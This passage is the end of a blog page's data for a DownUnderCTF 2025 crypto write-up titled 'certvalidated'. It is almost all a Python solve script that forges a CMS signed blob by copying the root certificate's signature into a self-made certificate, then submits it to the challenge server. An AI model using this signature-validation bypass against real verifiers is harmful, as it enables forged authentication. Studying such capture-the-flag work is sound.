punctuation\">.</span>add_extension<span class=\"token punctuation\">(</span>x509<span class=\"token punctuation\">.</span>KeyUsage<span class=\"token punctuation\">(</span>\n        digital_signature<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n        content_commitment<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n        key_encipherment<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n        data_encipherment<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n        key_agreement<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n        key_cert_sign<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n        crl_sign<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n        encipher_only<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n        decipher_only<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> critical<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span>\n    certificate <span class=\"token operator\">=</span> builder<span class=\"token punctuation\">.</span>sign<span class=\"token punctuation\">(</span>private_key<span class=\"token operator\">=</span>issuer_privkey<span class=\"token punctuation\">,</span> algorithm<span class=\"token operator\">=</span>hashes<span class=\"token punctuation\">.</span>SHA256<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> certificate<span class=\"token punctuation\">,</span> private_key <span class=\"token keyword\">or</span> issuer_privkey\n\n\nroot_crt <span class=\"token operator\">=</span> x509<span class=\"token punctuation\">.</span>load_pem_x509_certificate<span class=\"token punctuation\">(</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'../publish/root.crt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nmy_crt<span class=\"token punctuation\">,</span> my_key <span class=\"token operator\">=</span> create_cert<span class=\"token punctuation\">(</span><span class=\"token string\">'my cert'</span><span class=\"token punctuation\">,</span> pubkey<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> issuer<span class=\"token operator\">=</span>root_crt<span class=\"token punctuation\">.</span>issuer<span class=\"token punctuation\">,</span> issuer_privkey<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span>\n\nmy_crt_der <span class=\"token operator\">=</span> my_crt<span class=\"token punctuation\">.</span>public_bytes<span class=\"token punctuation\">(</span>serialization<span class=\"token punctuation\">.</span>Encoding<span class=\"token punctuation\">.</span>DER<span class=\"token punctuation\">)</span>\nroot_crt_der <span class=\"token operator\">=</span> root_crt<span class=\"token punctuation\">.</span>public_bytes<span class=\"token punctuation\">(</span>serialization<span class=\"token punctuation\">.</span>Encoding<span class=\"token punctuation\">.</span>DER<span class=\"token punctuation\">)</span>\n\nmy_crt_kid <span class=\"token operator\">=</span> cms<span class=\"token punctuation\">.</span>Certificate<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span>my_crt_der<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>public_key<span class=\"token punctuation\">.</span>sha1\n\n<span class=\"token comment\"># conn = process(['python3', './chal.py'])</span>\nconn <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1337</span><span class=\"token punctuation\">)</span>\nto_sign <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;&lt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'>>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nsig <span class=\"token operator\">=</span> my_key<span class=\"token punctuation\">.</span>sign<span class=\"token punctuation\">(</span>to_sign<span class=\"token punctuation\">,</span> padding<span class=\"token punctuation\">.</span>PKCS1v15<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> hashes<span class=\"token punctuation\">.</span>SHA256<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsd <span class=\"token operator\">=</span> cms<span class=\"token punctuation\">.</span>SignedData<span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    <span class=\"token string\">'version'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'v1'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'encap_content_info'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">'content_type'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'data'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'content'</span><span class=\"token punctuation\">:</span> to_sign\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'digest_algorithms'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">'algorithm'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'sha256'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'parameters'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'certificates'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n        cms<span class=\"token punctuation\">.</span>CertificateChoices<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span>my_crt_der<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span>my_crt<span class=\"token punctuation\">.</span>signature<span class=\"token punctuation\">,</span> root_crt<span class=\"token punctuation\">.</span>signature<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'signer_infos'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">'version'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'v1'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'digest_algorithm'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">'algorithm'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'sha256'</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">'parameters'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'signature_algorithm'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">'algorithm'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'sha256_rsa'</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">'parameters'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'signature'</span><span class=\"token punctuation\">:</span> sig<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'sid'</span><span class=\"token punctuation\">:</span> cms<span class=\"token punctuation\">.</span>IssuerAndSerialNumber<span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n                <span class=\"token string\">'issuer'</span><span class=\"token punctuation\">:</span> ax509<span class=\"token punctuation\">.</span>Name<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span>my_crt<span class=\"token punctuation\">.</span>issuer<span class=\"token punctuation\">.</span>public_bytes<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">'serial_number'</span><span class=\"token punctuation\">:</span> my_crt<span class=\"token punctuation\">.</span>serial_number\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\nci <span class=\"token operator\">=</span> cms<span class=\"token punctuation\">.</span>ContentInfo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    <span class=\"token string\">'content_type'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'signed_data'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'content'</span><span class=\"token punctuation\">:</span> sd\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n\nconn<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your CMS blob (base64): '</span><span class=\"token punctuation\">,</span> b64encode<span class=\"token punctuation\">(</span>ci<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nconn<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>","frontmatter":{"date":"August 12, 2025","path":"/posts/2025-08-12-downunderctf-2025-certvalidated","title":"DownUnderCTF 2025 - certvalidated","tags":"ctf,writeup,crypto"}}},"pageContext":{"prev":{"fileAbsolutePath":"/home/joseph/stuff/code/portfolio/src/posts/2025-04-07-plaid-ctf-2025-tales-from-the-crypt/index.md","frontmatter":{"title":"Plaid CTF 2025 - Tales from the Crypt","date":"2025-04-07T00:00:00.000Z","path":"/posts/2025-04-07-plaid-ctf-2025-tales-from-the-crypt"}},"next":{"fileAbsolutePath":"/home/joseph/stuff/code/portfolio/src/posts/2025-10-08-jailctf-2025-stupidcplusplus/index.md","frontmatter":{"title":"jailCTF 2025 - 'stupɪd si plʌs plʌs","date":"2025-10-08T00:00:00.000Z","path":"/posts/2025-10-08-jailctf-2025-stupidcplusplus"}}}},
    "staticQueryHashes": ["4146750380"]}